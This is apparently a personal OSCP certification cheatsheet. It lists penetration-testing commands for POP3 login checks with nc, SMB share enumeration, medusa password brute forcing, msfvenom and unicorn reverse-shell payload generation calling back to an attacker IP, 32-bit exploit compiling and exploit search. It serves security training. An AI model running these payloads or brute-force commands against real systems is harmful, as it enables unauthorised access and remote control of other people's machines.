# Another-OSCP-Cheatsheet
This is my personal OSCP cheatsheet that also "hopefully" would let me pass my exam. Any improvement is welcome :)

## POP3 enum
Enumerate if any user has info:

    for user in <user1> <user2> <user3>.. <userX>; do
    ( echo USER ${user}; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC <ip> <port>;  done
## SMB enum
**SHARES**

    nmap <ip> --script=smb-enum-shares
**SMB USER/CHECK**

    medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4	
## Windows Payloads
    
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>
## Kernel Cross-Compiling

Really helpful if you are facing an old-school 32-bit box (believe me, there's tons of them in OSCP Labs xd)
Choose the --static option wisely https://stackoverflow.com/questions/8692128/static-option-for-gcc

    gcc ¿--static? -m32 -Wl, --hash-style=both <nombre.c> -o <output>			
## MACRO PAYLOAD
**UNICORN** is a great tool u NEED to use in your OSCP journey https://github.com/trustedsec/unicorn

    python unicorn.py windows/x64/shell_reverse_tcp 11.1.1.151234 macro
    
## Common Exploits
**MS17-010** If you are facing EternalBlue :) https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/				

## Exploit search
Use -m to download the exploit

    searchsploit <service name>
    
